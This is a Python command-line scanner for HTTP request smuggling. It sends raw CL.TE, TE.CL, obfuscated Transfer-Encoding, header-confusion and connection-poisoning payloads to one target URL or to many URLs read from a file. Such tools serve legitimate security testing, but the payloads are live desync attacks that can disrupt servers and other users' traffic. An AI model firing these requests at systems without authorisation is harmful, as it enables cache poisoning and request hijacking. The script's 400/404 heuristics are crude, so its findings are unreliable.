import requests
import socket
import ssl
import argparse
import sys
import time
from urllib.parse import urlparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class HTTPRequestSmuggler:
    def __init__(self, target_url, timeout=10, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(target_url)
        self.timeout = timeout
        self.verbose = verbose
        self.host = self.parsed_url.netloc
        self.port = 443 if self.parsed_url.scheme == 'https' else 80
        self.use_ssl = self.parsed_url.scheme == 'https'
        
    def print_info(self, message):
        """Print info message"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {message}")
    
    def print_success(self, message):
        """Print success message"""
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {message}")
    
    def print_warning(self, message):
        """Print warning message"""
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {message}")
    
    def print_error(self, message):
        """Print error message"""
        print(f"{Fore.RED}[-]{Style.RESET_ALL} {message}")
    
    def create_connection(self):
        """Create a socket connection to the target"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.connect((self.host, self.port))
            return sock
        except Exception as e:
            self.print_error(f"Connection failed: {e}")
            return None
    
    def send_raw_request(self, request):
        """Send raw HTTP request and get response"""
        sock = self.create_connection()
        if not sock:
            return None
        
        try:
            if self.verbose:
                self.print_info("Sending request:")
                print(f"{Fore.YELLOW}{request}{Style.RESET_ALL}")
            
            sock.sendall(request.encode())
            response = b""
            
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            
            sock.close()
            return response.decode('utf-8', errors='ignore')
        
        except Exception as e:
            self.print_error(f"Error sending request: {e}")
            return None
    
    def test_cl_te_desync(self):
        """Test CL.TE (Content-Length vs Transfer-Encoding) desync"""
        self.print_info("Testing CL.TE desync vulnerability...")
        
        # Attack payload - Front-end uses Content-Length, Back-end uses Transfer-Encoding
        attack_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        )
        
        response = self.send_raw_request(attack_request)
        
        if response:
            if "400" in response or "Bad Request" in response:
                self.print_success("Potential CL.TE desync detected! (Got 400 Bad Request)")
                return True
            elif "timeout" in response.lower():
                self.print_warning("Possible CL.TE desync (timeout detected)")
                return True
        
        self.print_info("No CL.TE desync detected")
        return False
    
    def test_te_cl_desync(self):
        """Test TE.CL (Transfer-Encoding vs Content-Length) desync"""
        self.print_info("Testing TE.CL desync vulnerability...")
        
        # Attack payload - Front-end uses Transfer-Encoding, Back-end uses Content-Length
        attack_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        response = self.send_raw_request(attack_request)
        
        if response:
            if "400" in response or "Bad Request" in response:
                self.print_success("Potential TE.CL desync detected! (Got 400 Bad Request)")
                return True
            elif "timeout" in response.lower():
                self.print_warning("Possible TE.CL desync (timeout detected)")
                return True
        
        self.print_info("No TE.CL desync detected")
        return False
    
    def test_te_te_desync(self):
        """Test TE.TE (obfuscated Transfer-Encoding) desync"""
        self.print_info("Testing TE.TE desync vulnerability...")
        
        # Various Transfer-Encoding obfuscation techniques
        obfuscations = [
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\n Transfer-Encoding: x",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding:\tchunked",
        ]
        
        for obfuscation in obfuscations:
            attack_request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"{obfuscation}\r\n"
                f"Content-Length: 4\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 15\r\n"
                f"\r\n"
                f"x=1\r\n"
                f"0\r\n"
                f"\r\n"
            )
            
            response = self.send_raw_request(attack_request)
            
            if response:
                if "400" in response or "Bad Request" in response:
                    self.print_success(f"Potential TE.TE desync detected with: {obfuscation[:50]}")
                    return True
        
        self.print_info("No TE.TE desync detected")
        return False
    
    def test_timing_based_detection(self):
        """Test for request smuggling using timing techniques"""
        self.print_info("Testing timing-based detection...")
        
        # Send normal request and measure time
        normal_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        
        start = time.time()
        self.send_raw_request(normal_request)
        normal_time = time.time() - start
        
        # Send potentially smuggled request
        smuggled_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET /404 HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"\r\n"
        )
        
        start = time.time()
        self.send_raw_request(smuggled_request)
        smuggled_time = time.time() - start
        
        self.print_info(f"Normal request time: {normal_time:.2f}s")
        self.print_info(f"Smuggled request time: {smuggled_time:.2f}s")
        
        if smuggled_time > normal_time * 2:
            self.print_warning("Timing difference detected - possible request smuggling")
            return True
        
        return False
    
    def test_differential_responses(self):
        """Test for differential responses indicating smuggling"""
        self.print_info("Testing differential responses...")
        
        # Send request that should trigger different response if smuggled
        test_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 49\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"e\r\n"
            f"q=smuggling&x=\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET /404 HTTP/1.1\r\n"
            f"Foo: x"
        )
        
        response = self.send_raw_request(test_request)
        
        if response:
            if "404" in response or "Not Found" in response:
                self.print_success("Differential response detected - smuggling likely!")
                return True
        
        return False
    
    def test_connection_state_attack(self):
        """Test connection state manipulation"""
        self.print_info("Testing connection state manipulation...")
        
        # First request - poison the connection
        poison_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        )
        
        sock = self.create_connection()
        if not sock:
            return False
        
        try:
            sock.sendall(poison_request.encode())
            time.sleep(1)
            
            # Second request on same connection
            normal_request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"\r\n"
            )
            
            sock.sendall(normal_request.encode())
            
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            
            sock.close()
            
            response_str = response.decode('utf-8', errors='ignore')
            if "400" in response_str or "Bad Request" in response_str:
                self.print_success("Connection state attack successful!")
                return True
        
        except Exception as e:
            self.print_error(f"Error in connection state test: {e}")
        
        return False
    
    def test_header_confusion(self):
        """Test for header confusion vulnerabilities"""
        self.print_info("Testing header confusion...")
        
        confusion_payloads = [
            # Double Content-Length
            (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 6\r\n"
                f"Content-Length: 0\r\n"
                f"\r\n"
                f"12345\r\n"
            ),
            # Content-Length with spaces
            (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 6\r\n"
                f"Content-Length : 0\r\n"
                f"\r\n"
                f"12345\r\n"
            ),
            # Chunked with Content-Length 0
            (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 0\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"5\r\n"
                f"12345\r\n"
                f"0\r\n"
                f"\r\n"
            ),
        ]
        
        for payload in confusion_payloads:
            response = self.send_raw_request(payload)
            if response:
                if "400" in response or "Bad Request" in response or "500" in response:
                    self.print_success("Header confusion detected!")
                    return True
        
        return False
    
    def test_http2_smuggling(self):
        """Test for HTTP/2 request smuggling (H2.CL)"""
        self.print_info("Testing HTTP/2 smuggling (basic detection)...")
        
        # This is a simplified test - real HTTP/2 testing requires proper HTTP/2 library
        try:
            response = requests.get(
                self.target_url,
                headers={'Content-Length': '0', 'Transfer-Encoding': 'chunked'},
                timeout=self.timeout
            )
            
            if response.status_code in [400, 502, 503]:
                self.print_warning("Possible HTTP/2 smuggling vulnerability")
                return True
        except:
            pass
        
        return False
    
    def run_all_tests(self):
        """Run all request smuggling tests"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}HTTP Request Smuggling Detection Tool{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        self.print_info(f"Target: {self.target_url}")
        self.print_info(f"Host: {self.host}")
        self.print_info(f"Port: {self.port}")
        self.print_info(f"SSL: {self.use_ssl}\n")
        
        vulnerabilities = []
        
        # Run tests
        tests = [
            ("CL.TE Desync", self.test_cl_te_desync),
            ("TE.CL Desync", self.test_te_cl_desync),
            ("TE.TE Desync", self.test_te_te_desync),
            ("Timing-based Detection", self.test_timing_based_detection),
            ("Differential Responses", self.test_differential_responses),
            ("Connection State Attack", self.test_connection_state_attack),
            ("Header Confusion", self.test_header_confusion),
            ("HTTP/2 Smuggling", self.test_http2_smuggling),
        ]
        
        for test_name, test_func in tests:
            print(f"\n{Fore.YELLOW}{'─'*70}{Style.RESET_ALL}")
            try:
                if test_func():
                    vulnerabilities.append(test_name)
            except Exception as e:
                self.print_error(f"Error in {test_name}: {e}")
            time.sleep(0.5)  # Small delay between tests
        
        # Summary
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        if vulnerabilities:
            self.print_warning(f"Found {len(vulnerabilities)} potential vulnerability(ies):")
            for vuln in vulnerabilities:
                print(f"  {Fore.RED}• {vuln}{Style.RESET_ALL}")
            
            print(f"\n{Fore.YELLOW}Recommendations:{Style.RESET_ALL}")
            print("  • Normalize Transfer-Encoding and Content-Length headers")
            print("  • Use HTTP/2 exclusively (if possible)")
            print("  • Deploy WAF with request smuggling protection")
            print("  • Keep servers and proxies updated")
            print("  • Reject ambiguous requests")
        else:
            self.print_success("No request smuggling vulnerabilities detected")
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")


def test_multiple_urls(urls_file, timeout=10, verbose=False):
    """Test multiple URLs from a file"""
    try:
        with open(urls_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        print(f"{Fore.CYAN}Testing {len(urls)} URLs...{Style.RESET_ALL}\n")
        
        results = {}
        for idx, url in enumerate(urls, 1):
            print(f"\n{Fore.YELLOW}[{idx}/{len(urls)}] Testing: {url}{Style.RESET_ALL}")
            smuggler = HTTPRequestSmuggler(url, timeout, verbose)
            smuggler.run_all_tests()
            results[url] = smuggler
        
        return results
    
    except FileNotFoundError:
        print(f"{Fore.RED}Error: File '{urls_file}' not found{Style.RESET_ALL}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description='HTTP Request Smuggling Detection Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test single URL
  python http_smuggling.py -u https://example.com
  
  # Test with verbose output
  python http_smuggling.py -u https://example.com -v
  
  # Test multiple URLs from file
  python http_smuggling.py -f urls.txt
  
  # Custom timeout
  python http_smuggling.py -u https://example.com -t 15
        """
    )
    
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-f', '--file', help='File containing URLs (one per line)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
    
    if args.file:
        test_multiple_urls(args.file, args.timeout, args.verbose)
    elif args.url:
        smuggler = HTTPRequestSmuggler(args.url, args.timeout, args.verbose)
        smuggler.run_all_tests()


if __name__ == "__main__":
    main()